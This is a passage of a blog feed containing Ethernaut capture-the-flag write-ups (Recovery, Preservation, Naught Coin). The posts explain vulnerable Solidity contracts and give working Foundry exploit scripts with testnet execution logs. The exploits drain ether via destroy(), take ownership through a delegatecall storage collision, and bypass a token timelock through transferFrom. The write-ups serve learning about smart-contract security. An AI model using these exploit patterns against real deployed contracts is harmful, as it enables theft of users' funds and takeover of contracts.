interacted with the <code class=\"language-plaintext highlighter-rouge\">0x8a53</code> contract and called the <code class=\"language-plaintext highlighter-rouge\">generateToken()</code> function.</p><p>Subsequently, <code class=\"language-plaintext highlighter-rouge\">0x8a53</code> interacted with another contract, <code class=\"language-plaintext highlighter-rouge\">0xc413</code>.</p><p>We suspect <code class=\"language-plaintext highlighter-rouge\">0xc413</code> is the lost contract.</p><p><img src=\"https://0o3q.github.io/images/2025-05-17-Recovery/blockchainExplorer2.png\" alt=\"image.png\" /></p><p>When inspecting the transaction involving <code class=\"language-plaintext highlighter-rouge\">0xc413</code>, we can see that <code class=\"language-plaintext highlighter-rouge\">0x7585</code> sent exactly 0.001 Ether to <code class=\"language-plaintext highlighter-rouge\">0xc413</code>.</p><p>Based on the challenge hint — “creator sent 0.001 ether to obtain more tokens” — we can conclude that <code class=\"language-plaintext highlighter-rouge\">0xc413</code> is the lost contract we are looking for.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT// forge script script/RecoverySol.sol:RecoverySol --account mingw --sender 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url kairos --broadcast</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Recovery.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">RecoverySol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">SimpleToken</span> <span class=\"k\">public</span> <span class=\"n\">st_</span> <span class=\"o\">=</span> <span class=\"n\">SimpleToken</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0xC41399Fe813068a3A23DE4215C43584AA3A188A0</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before balance\"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">st_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">st_</span><span class=\"p\">.</span><span class=\"n\">destroy</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After balance\"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">st_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-05-17-Recovery/result.png\" alt=\"image.png\" /></p>",
            "url": "https://0o3q.github.io/2025/05/17/recovery",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","Explorer"],
            
            "date_published": "2025-05-17T00:00:00+09:00",
            "date_modified": "2025-05-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/05/15/preservation",
            "title": "[Ethernaut] 16.Preservation",
            "summary": null,
            "content_text": "AnalysisThe goal is  claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Preservation {    // public library contracts    address public timeZone1Library;    address public timeZone2Library;    address public owner;    uint256 storedTime;    // Sets the function signature for delegatecall    bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {        timeZone1Library = _timeZone1LibraryAddress;        timeZone2Library = _timeZone2LibraryAddress;        owner = msg.sender;    }    // set the time for timezone 1    function setFirstTime(uint256 _timeStamp) public {        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));    }    // set the time for timezone 2    function setSecondTime(uint256 _timeStamp) public {        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));    }}// Simple library contract to set the timecontract LibraryContract {    // stores a timestamp    uint256 storedTime;    function setTime(uint256 _time) public {        storedTime = _time;    }}In the Preservation contract, the setFirstTime() and setSecondTime() functions use delegatecall to update the storedTime.As demonstrated in the Delegation challenge, delegatecall allows a called contract to modify the storage of the calling contract.As can be inferred from the hint, storage is accessed by slot number rather than by variable name when using delegatecall.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Preservation.sol\";import \"forge-std/Script.sol\";contract Ex {    address public AAAA;    address public BBBB;    address public owner;    function setTime(uint256 _owner) public {        owner = address(uint160(_owner));    }}contract PreservationSol is Script {    Preservation public pv_ = Preservation(0xD7cfE396981D91a4a11CB7261739F32F36cb9017);    function run() external {        vm.startBroadcast();        Ex ex = new Ex();        console.log(\"Before owner: \", pv_.owner());        console.log(\"Before timeZone1Library address: \", pv_.timeZone1Library());        pv_.setFirstTime(uint256(uint160(address(ex))));        console.log(\"First set: \", pv_.timeZone1Library());        pv_.setFirstTime(uint256(uint160(msg.sender)));        console.log(\"After owner: \", pv_.owner());        vm.stopBroadcast();    }}We can first overwrite the timeZone1Library variable with the address of a malicious contract, and then use it to overwrite the owner variable.$ forge script script/PreservationSol.sol:PreservationSol --account mingw --sender 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url kairos --broadcast[⠊] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Before owner:  0x7B587eD6A41030bEFD2FE6437a895D22260F7132  Before timeZone1Library address:  0xf24b27D4D691d05b59fb441d4df8374480D5E9Ac  After timeZone1Library address:  0x21dA2776E60d5FAB93773eE66b547c54038350C4  After timeZone1Library address:  0x21dA2776E60d5FAB93773eE66b547c54038350C4  After owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 1001Estimated gas price: 52.5 gweiEstimated total gas used for script: 327554Estimated amount required: 0.017196585 ETH==========================Enter keystore password:##### 1001✅  [Success] Hash: 0xbe01e24783ab42cd7662f2f25ed08617ff5d23ab1cf049118da11b30657d30e6Contract Address: 0x21dA2776E60d5FAB93773eE66b547c54038350C4Block: 185739056Paid: 0.0065975525 ETH (239911 gas * 27.5 gwei)##### 1001✅  [Success] Hash: 0x4d6913ae6d8cb717ff25cd1d5fd1bb3f836b1678b435e445b030ec1f8c4f4fe4Block: 185739056Paid: 0.000976855 ETH (35522 gas * 27.5 gwei)##### 1001✅  [Success] Hash: 0x4442bf1e8285f7fbf1b46c906cfc03367926bdd3ac633b8c7fe653c8e2c63481Block: 185739056Paid: 0.0009108 ETH (33120 gas * 27.5 gwei)✅ Sequence #1 on 1001 | Total Paid: 0.0084852075 ETH (308553 gas * avg 27.5 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Preservation</span> <span class=\"p\">{</span>    <span class=\"c1\">// public library contracts</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">timeZone1Library</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">timeZone2Library</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"n\">storedTime</span><span class=\"p\">;</span>    <span class=\"c1\">// Sets the function signature for delegatecall</span>    <span class=\"kt\">bytes4</span> <span class=\"k\">constant</span> <span class=\"n\">setTimeSignature</span> <span class=\"o\">=</span> <span class=\"kt\">bytes4</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"s\">\"setTime(uint256)\"</span><span class=\"p\">));</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_timeZone1LibraryAddress</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_timeZone2LibraryAddress</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">timeZone1Library</span> <span class=\"o\">=</span> <span class=\"n\">_timeZone1LibraryAddress</span><span class=\"p\">;</span>        <span class=\"n\">timeZone2Library</span> <span class=\"o\">=</span> <span class=\"n\">_timeZone2LibraryAddress</span><span class=\"p\">;</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// set the time for timezone 1</span>    <span class=\"k\">function</span> <span class=\"n\">setFirstTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_timeStamp</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">timeZone1Library</span><span class=\"p\">.</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodePacked</span><span class=\"p\">(</span><span class=\"n\">setTimeSignature</span><span class=\"p\">,</span> <span class=\"n\">_timeStamp</span><span class=\"p\">));</span>    <span class=\"p\">}</span>    <span class=\"c1\">// set the time for timezone 2</span>    <span class=\"k\">function</span> <span class=\"n\">setSecondTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_timeStamp</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">timeZone2Library</span><span class=\"p\">.</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodePacked</span><span class=\"p\">(</span><span class=\"n\">setTimeSignature</span><span class=\"p\">,</span> <span class=\"n\">_timeStamp</span><span class=\"p\">));</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"c1\">// Simple library contract to set the time</span><span class=\"k\">contract</span> <span class=\"n\">LibraryContract</span> <span class=\"p\">{</span>    <span class=\"c1\">// stores a timestamp</span>    <span class=\"kt\">uint256</span> <span class=\"n\">storedTime</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">setTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_time</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">storedTime</span> <span class=\"o\">=</span> <span class=\"n\">_time</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>In the Preservation contract, the <code class=\"language-plaintext highlighter-rouge\">setFirstTime()</code> and <code class=\"language-plaintext highlighter-rouge\">setSecondTime()</code> functions use delegatecall to update the <code class=\"language-plaintext highlighter-rouge\">storedTime</code>.</p><p>As demonstrated in the <a href=\"https://0o3q.github.io/2025/04/19/delegation\">Delegation</a> challenge, <code class=\"language-plaintext highlighter-rouge\">delegatecall</code> allows a called contract to modify the storage of the calling contract.</p><p>As can be inferred from the hint, storage is accessed by slot number rather than by variable name when using <code class=\"language-plaintext highlighter-rouge\">delegatecall</code>.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Preservation.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">AAAA</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">BBBB</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">setTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">_owner</span><span class=\"p\">));</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">PreservationSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Preservation</span> <span class=\"k\">public</span> <span class=\"n\">pv_</span> <span class=\"o\">=</span> <span class=\"n\">Preservation</span><span class=\"p\">(</span><span class=\"mh\">0xD7cfE396981D91a4a11CB7261739F32F36cb9017</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before owner: \"</span><span class=\"p\">,</span> <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before timeZone1Library address: \"</span><span class=\"p\">,</span> <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">timeZone1Library</span><span class=\"p\">());</span>        <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">setFirstTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">ex</span><span class=\"p\">))));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"First set: \"</span><span class=\"p\">,</span> <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">timeZone1Library</span><span class=\"p\">());</span>        <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">setFirstTime</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After owner: \"</span><span class=\"p\">,</span> <span class=\"n\">pv_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>We can first overwrite the <code class=\"language-plaintext highlighter-rouge\">timeZone1Library</code> variable with the address of a malicious contract, and then use it to overwrite the <code class=\"language-plaintext highlighter-rouge\">owner</code> variable.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/PreservationSol.sol:PreservationSol <span class=\"nt\">--account</span> mingw <span class=\"nt\">--sender</span> 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 <span class=\"nt\">--rpc-url</span> kairos <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before owner:  0x7B587eD6A41030bEFD2FE6437a895D22260F7132  Before timeZone1Library address:  0xf24b27D4D691d05b59fb441d4df8374480D5E9Ac  After timeZone1Library address:  0x21dA2776E60d5FAB93773eE66b547c54038350C4  After timeZone1Library address:  0x21dA2776E60d5FAB93773eE66b547c54038350C4  After owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 1001Estimated gas price: 52.5 gweiEstimated total gas used <span class=\"k\">for </span>script: 327554Estimated amount required: 0.017196585 ETH<span class=\"o\">==========================</span>Enter keystore password:<span class=\"c\">##### 1001</span>✅  <span class=\"o\">[</span>Success] Hash: 0xbe01e24783ab42cd7662f2f25ed08617ff5d23ab1cf049118da11b30657d30e6Contract Address: 0x21dA2776E60d5FAB93773eE66b547c54038350C4Block: 185739056Paid: 0.0065975525 ETH <span class=\"o\">(</span>239911 gas <span class=\"k\">*</span> 27.5 gwei<span class=\"o\">)</span><span class=\"c\">##### 1001</span>✅  <span class=\"o\">[</span>Success] Hash: 0x4d6913ae6d8cb717ff25cd1d5fd1bb3f836b1678b435e445b030ec1f8c4f4fe4Block: 185739056Paid: 0.000976855 ETH <span class=\"o\">(</span>35522 gas <span class=\"k\">*</span> 27.5 gwei<span class=\"o\">)</span><span class=\"c\">##### 1001</span>✅  <span class=\"o\">[</span>Success] Hash: 0x4442bf1e8285f7fbf1b46c906cfc03367926bdd3ac633b8c7fe653c8e2c63481Block: 185739056Paid: 0.0009108 ETH <span class=\"o\">(</span>33120 gas <span class=\"k\">*</span> 27.5 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on 1001 | Total Paid: 0.0084852075 ETH (308553 gas * avg 27.5 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div>",
            "url": "https://0o3q.github.io/2025/05/15/preservation",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","delegatecall","storage_collision"],
            
            "date_published": "2025-05-15T00:00:00+09:00",
            "date_modified": "2025-05-15T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/05/01/naughtcoin",
            "title": "[Ethernaut] 15.Naught Coin",
            "summary": null,
            "content_text": "AnalysisThe goal is  getting your token balance to 0// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\";contract NaughtCoin is ERC20 {    // string public constant name = 'NaughtCoin';    // string public constant symbol = '0x0';    // uint public constant decimals = 18;    uint256 public timeLock = block.timestamp + 10 * 365 days;    uint256 public INITIAL_SUPPLY;    address public player;    constructor(address _player) ERC20(\"NaughtCoin\", \"0x0\") {        player = _player;        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));        // _totalSupply = INITIAL_SUPPLY;        // _balances[player] = INITIAL_SUPPLY;        _mint(player, INITIAL_SUPPLY);        emit Transfer(address(0), player, INITIAL_SUPPLY);    }    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {        super.transfer(_to, _value);    }    // Prevent the initial owner from transferring tokens until the timelock has passed    modifier lockTokens() {        if (msg.sender == player) {            require(block.timestamp &gt; timeLock);            _;        } else {            _;        }    }}timeLock is set to 10 years after the block was createdThis code should be read:openzeppelin-contracts-08/token/ERC20/ERC20.solExploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/NaughtCoin.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";import \"openzeppelin-contracts-08/contracts/token/ERC20/ERC20.sol\";contract Ex {    function ex(NaughtCoin nc_, address _player, uint256 _token) external{        nc_.transferFrom(_player, address(this), _token);    }}contract NaughtCoinSol is Script {    NaughtCoin public nc_ = NaughtCoin(0x6bF577FBb92fcE9F1480EbBeD1aC0403b21025b2);    uint256 public token = nc_.INITIAL_SUPPLY();    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"Balances: \", nc_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));        Ex ex = new Ex();        nc_.approve(address(ex), token);        ex.ex(nc_, vm.envAddress(\"MY_ADDRESS\"), token);        console.log(\"Balances: \", nc_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));                vm.stopBroadcast();    }}The transferFrom function can retrieve tokens up to the approved amount if approval was previously granted through the approve function.After creating the Ex contract and granting approval, tokens can be retrieved from the Ex contract using the transferFrom function without the timeLock restriction.$ forge script script/NaughtCoinSol.sol:NaughtCoinSol --broadcast[⠒] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Balances:  1000000000000000000000000  Balances:  0## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001008466 gweiEstimated total gas used for script: 410540Estimated amount required: 0.00000041401563164 ETH==========================⠂ Sequence #1 on holesky | Waiting for pending transactions    ⠠ [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ⡀ [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749⢀ Sequence #1 on holesky | Waiting for pending transactions    ⡀ [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ⠄ [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749⠁ Sequence #1 on holesky | Waiting for pending transactions    ⠂ [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ⠐ [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749⠁ Sequence #1 on holesky | Waiting for pending transactions    ⠁ [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3    ⠠ [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749##### holesky✅  [Success] Hash: 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3Contract Address: 0x5027B78a821BB27bd371F0699bC6CDC12778C34eBlock: 3767317Paid: 0.000000210921904108 ETH (209156 gas * 0.001008443 gwei)##### holesky✅  [Success] Hash: 0x393caf180b8749d4deac62bc9e0c2905ec4ee8cf3f243272f2c115cccf935125Block: 3767317Paid: 0.000000054534580554 ETH (54078 gas * 0.001008443 gwei)##### holesky✅  [Success] Hash: 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749Block: 3767317Paid: 0.000000046685868685 ETH (46295 gas * 0.001008443 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000312142353347 ETH (309529 gas * avg 0.001008443 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>getting your token balance to 0</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/token/ERC20/ERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">NaughtCoin</span> <span class=\"k\">is</span> <span class=\"n\">ERC20</span> <span class=\"p\">{</span>    <span class=\"c1\">// string public constant name = 'NaughtCoin';</span>    <span class=\"c1\">// string public constant symbol = '0x0';</span>    <span class=\"c1\">// uint public constant decimals = 18;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">timeLock</span> <span class=\"o\">=</span> <span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">timestamp</span> <span class=\"o\">+</span> <span class=\"mi\">10</span> <span class=\"o\">*</span> <span class=\"mi\">365</span> <span class=\"kc\">days</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">INITIAL_SUPPLY</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">player</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_player</span><span class=\"p\">)</span> <span class=\"n\">ERC20</span><span class=\"p\">(</span><span class=\"s\">\"NaughtCoin\"</span><span class=\"p\">,</span> <span class=\"s\">\"0x0\"</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">player</span> <span class=\"o\">=</span> <span class=\"n\">_player</span><span class=\"p\">;</span>        <span class=\"n\">INITIAL_SUPPLY</span> <span class=\"o\">=</span> <span class=\"mi\">1000000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">10</span> <span class=\"o\">**</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"n\">decimals</span><span class=\"p\">()));</span>        <span class=\"c1\">// _totalSupply = INITIAL_SUPPLY;</span>        <span class=\"c1\">// _balances[player] = INITIAL_SUPPLY;</span>        <span class=\"n\">_mint</span><span class=\"p\">(</span><span class=\"n\">player</span><span class=\"p\">,</span> <span class=\"n\">INITIAL_SUPPLY</span><span class=\"p\">);</span>        <span class=\"k\">emit</span> <span class=\"n\">Transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"n\">player</span><span class=\"p\">,</span> <span class=\"n\">INITIAL_SUPPLY</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_value</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">override</span> <span class=\"n\">lockTokens</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">super</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">_to</span><span class=\"p\">,</span> <span class=\"n\">_value</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"c1\">// Prevent the initial owner from transferring tokens until the timelock has passed</span>    <span class=\"k\">modifier</span> <span class=\"n\">lockTokens</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">player</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">timestamp</span> <span class=\"o\">&gt;</span> <span class=\"n\">timeLock</span><span class=\"p\">);</span>            <span class=\"n\">_</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"n\">_</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">timeLock</code> is set to 10 years after the block was created</p><p>This code should be read:<a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/token/ERC20/ERC20.sol\">openzeppelin-contracts-08/token/ERC20/ERC20.sol</a></p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/NaughtCoin.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/contracts/token/ERC20/ERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span 